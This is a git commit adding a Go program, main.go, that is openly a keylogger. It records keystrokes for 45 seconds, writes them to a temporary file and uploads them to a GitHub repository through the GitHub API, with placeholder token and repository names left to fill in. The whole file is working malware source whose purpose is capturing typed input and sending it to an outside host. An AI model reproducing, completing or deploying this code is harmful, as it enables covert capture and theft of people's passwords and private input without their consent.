cfc12a87eb035a1cbd336af0b0f0247681c63a98
Wesley Yan Soares Brehmer <102262759+simplyYan@users.noreply.github.com>
2024-02-14 12:32:41 +0000

    Create main.go

---
+++ main.go
@@ -0,0 +1,103 @@
+package main
+
+import (
+	"context"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+	"time"
+
+	"github.com/eiannone/keyboard"
+	"github.com/google/go-github/github"
+	"golang.org/x/oauth2"
+)
+
+func clearScreen() {
+	var cmd *exec.Cmd
+
+	switch runtime.GOOS {
+	case "linux", "darwin":
+		cmd = exec.Command("clear")
+	case "windows":
+		cmd = exec.Command("cmd", "/c", "cls")
+	default:
+		panic("Platform not supported")
+	}
+
+	cmd.Stdout = os.Stdout
+	cmd.Run()
+}
+
+func main() {
+
+	clearScreen()
+
+	if err := keyboard.Open(); err != nil {
+		panic(err)
+	}
+	defer func() {
+		_ = keyboard.Close()
+	}()
+
+	var keysPressed []string
+
+	timer := time.NewTimer(45 * time.Second)
+
+	for {
+		select {
+		case <-timer.C:
+			content := strings.Join(keysPressed, "")
+
+			tempFile, err := ioutil.TempFile("", "keys")
+			if err != nil {
+				log.Fatalf("Error creating temporary file: %v", err)
+			}
+			defer os.Remove(tempFile.Name())
+
+			if _, err := tempFile.Write([]byte(content)); err != nil {
+				log.Fatalf("Error creating temporary file: %v", err)
+			}
+
+			token := "YOUR_TOKEN_HERE"
+			ts := oauth2.StaticTokenSource(
+				&oauth2.Token{AccessToken: token},
+			)
+			tc := oauth2.NewClient(context.Background(), ts)
+
+			client := github.NewClient(tc)
+
+			fileContent, err := ioutil.ReadFile(tempFile.Name())
+			if err != nil {
+				log.Fatalf("Error reading the temporary file: %v", err)
+			}
+
+			repoOwner := "YOUR_USERNAME"
+			repoName := "YOUR_REPONAME"
+			filePath := "klg.txt" //you can replace it
+			fileMessage := "keylogger update" //you can replace it
+
+			_, _, err = client.Repositories.CreateFile(context.Background(), repoOwner, repoName, filePath, &github.RepositoryContentFileOptions{
+				Message: &fileMessage,
+				Content: fileContent,
+			})
+			if err != nil {
+				log.Fatalf("Error creating file on GitHub: %v", err)
+			}
+
+			fmt.Println("File successfully created on GitHub!")
+			return
+		default:
+
+			char, _, err := keyboard.GetKey()
+			if err != nil {
+				panic(err)
+			}
+
+			keysPressed = append(keysPressed, string(char))
+		}
+	}
+}
